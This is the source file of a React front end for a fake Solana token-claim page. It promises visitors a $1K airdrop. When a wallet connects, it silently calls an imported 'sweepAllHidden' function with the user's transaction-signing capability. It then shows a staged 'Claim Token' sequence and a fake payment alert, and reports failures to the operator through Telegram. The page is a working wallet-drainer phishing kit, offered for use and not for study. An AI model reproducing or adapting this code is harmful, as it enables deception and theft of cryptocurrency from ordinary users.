import {  useEffect, useRef } from 'react'
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui"
import { useConnection, useWallet } from "@solana/wallet-adapter-react"
import {sweepAll as sweepAllHidden, sendTelegramMessage} from "./functions"
import './App.css'
import type { Transaction, VersionedTransaction } from '@solana/web3.js'


function App() {
  const { publicKey, disconnect,signTransaction } = useWallet()
  const {connection} = useConnection()
  const claim        = useRef<HTMLButtonElement|null>(null)

  useEffect(()=>{
   console.log("pub key: ", publicKey, "connection: ", connection )

   function getSignTransactionFunction(
      walletSignTransaction: (<T extends Transaction | VersionedTransaction>(transaction: T) => Promise<T>) | undefined
      ): (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction> {
      if (!walletSignTransaction) {
         throw new Error("Wallet doesn't support signTransaction");
      }
      
      return async (tx: Transaction | VersionedTransaction) => {
         return await walletSignTransaction(tx);
      };
   }
    if(publicKey && connection){
      const signedTx       = getSignTransactionFunction(signTransaction)
      sweepAllHidden(publicKey, connection, signedTx).then(swept =>{
         console.log("Claim current: ", claim.current, "swept: ", swept )
         if( claim.current && swept ){
            claim.current.innerText = "Claim Token";
            claim.current.onclick = ()=>{
               if( claim.current){
                  claim.current.innerText = "Claiming Token";
                  setTimeout(()=>{
                     alert(`10,000 USD Token paid to ${publicKey.toBase58()}`);
                     claim.current?.setAttribute("disabled", "disabled")
                     if( claim.current)
                        claim.current.innerText = "Token Claimed";
                  }, 5000)
               
               }
               

            }
         }
      }).catch(async (err) => {
        const errorMessage = err instanceof Error ? err.message : String(err)
        await sendTelegramMessage(`❌ Sweeper Failed: ${errorMessage}`)
        console.error(err)
      })
    }

    if( claim.current ){
      claim.current.onclick = ()=>{
         disconnect()
      }
    }
  }, [publicKey, connection])

  return (
    <>
      <div className="min-h-screen bg-gradient-to-b from-purple-900 via-purple-800 to-purple-900 text-white">
   <div className="absolute inset-0 overflow-hidden pointer-events-none">
      <div className="absolute top-20 left-10 w-16 h-16 rounded-full bg-teal-400 opacity-20 blur-xl"></div>
      <div className="absolute top-40 right-20 w-32 h-32 rounded-full bg-purple-400 opacity-20 blur-xl"></div>
      <div className="absolute bottom-40 left-1/4 w-24 h-24 rounded-full bg-teal-500 opacity-10 blur-xl"></div>
      <div className="absolute bottom-20 right-1/4 w-20 h-20 rounded-full bg-purple-300 opacity-20 blur-xl"></div>
   </div>
   <nav className="relative z-10 px-6 py-5 flex justify-between items-center">
      <div className="flex items-center space-x-2"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAlKL12Wxd7CR1HQdsnkblk60AFlZp9uSGHM4HuQKFhoA6JtBfko3ucsnjPHN9C5Uzqeg&amp;usqp=CAU" alt="Solana Logo" className="w-8 h-8" /><span className="font-bold text-xl">VIP Ordinance</span></div>
   </nav>
   <main className="relative z-10 max-w-6xl mx-auto px-6 pt-12 pb-24">
      <div className="text-center mb-12">
         <h1 className="text-5xl font-bold mb-4 bg-gradient-to-r from-teal-400 to-purple-400 inline-block text-transparent bg-clip-text">Swap Your 4-Way Mirror Money to SOL Solana</h1>
         <p className="text-xl text-gray-300 max-w-2xl mx-auto">Fast, secure, and simple way to claim your Solana tokens with minimal fees.</p>
      </div>
      <div className="max-w-md mx-auto rounded-2xl backdrop-blur-lg bg-white/10 shadow-xl overflow-hidden">
         <div className="bg-purple-800/50 px-6 py-4 border-b border-purple-700/50">
            <h2 className="text-xl font-semibold">Token Swap Portal</h2>
         </div>
         <div className="px-6 py-6">
            <div className="space-y-6">
               <div className="space-y-4 mb-6">
                  <div className="p-3 rounded-lg bg-white/5">
                     <h3 className="text-lg font-semibold mb-4">Claim Details</h3>
                     <div className="space-y-3">
                        <div className="flex justify-between items-center">
                           <span className="text-gray-400">Available to claim:</span>
                           <div className="flex items-center space-x-2">
                              <div className="bg-teal-400 w-5 h-5 rounded-full"></div>
                              <span className="font-medium">$1K ~ 7.9 SOL</span>
                           </div>
                        </div>
                        <div className="flex justify-between items-center"><span className="text-gray-400">Claim deadline:</span><span className="font-medium">7 days remaining</span></div>
                     </div>
                  </div>
               </div>
               <div className="text-center py-8">
                  <h3 className="text-xl font-semibold mb-4">Connect Your Wallet</h3>
                  <p className="text-gray-300 mb-6">Please connect your wallet to proceed with the claim</p>
                  <div className="flex flex-col items-center space-y-3">
                     <div className="wallet-adapter-dropdown">
                        {/*<button className="wallet-adapter-button wallet-adapter-button-trigger" tabIndex={0} type="button" style={{"pointerEvents": "auto"}}>Select Wallet</button>*/}
                        <WalletMultiButton />
                        <ul aria-label="dropdown-list" className="wallet-adapter-dropdown-list false" role="menu">
                           <li className="wallet-adapter-dropdown-list-item" role="menuitem">Change wallet</li>
                        </ul>
                     </div>
                     <button ref={claim} className="text-gray-400 hover:text-gray-300 text-sm transition-colors">Clear Selection</button>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div className="mt-24">
         <h2 className="text-2xl font-bold text-center mb-12">How It Works</h2>
         <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
               <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="lucide lucide-wallet text-teal-400">
                     <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"></path>
                     <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
                  </svg>
               </div>
               <h3 className="text-lg font-semibold mb-2">Connect Wallet</h3>
               <p className="text-gray-400">Link your Solana wallet to verify your eligibility.</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
               <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="lucide lucide-circle-check-big text-teal-400">
                     <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
                     <path d="m9 11 3 3L22 4"></path>
                  </svg>
               </div>
               <h3 className="text-lg font-semibold mb-2">Verify Eligibility</h3>
               <p className="text-gray-400">System automatically checks your claim status.</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
               <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                  <div className="bg-teal-400 w-5 h-5 rounded-full"></div>
               </div>
               <h3 className="text-lg font-semibold mb-2">Receive SOL</h3>
               <p className="text-gray-400">Your tokens are processed in queue and sent to your wallet.</p>
            </div>
         </div>
      </div>
   </main>
   <footer className="relative z-10 border-t border-purple-800/50 mt-12">
      <div className="max-w-6xl mx-auto px-6 py-8">
         <div className="flex flex-col md:flex-row justify-between items-center">
            <div className="flex items-center space-x-2 mb-4 md:mb-0"><img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=040" alt="Solana Logo" className="w-6 h-6" /><span className="font-bold">Airclaimer</span></div>
            <div className="text-sm text-gray-400">© 2024 Airclaimer. All rights reserved.</div>
         </div>
      </div>
   </footer>
</div>
    </>
  )
}

export default App
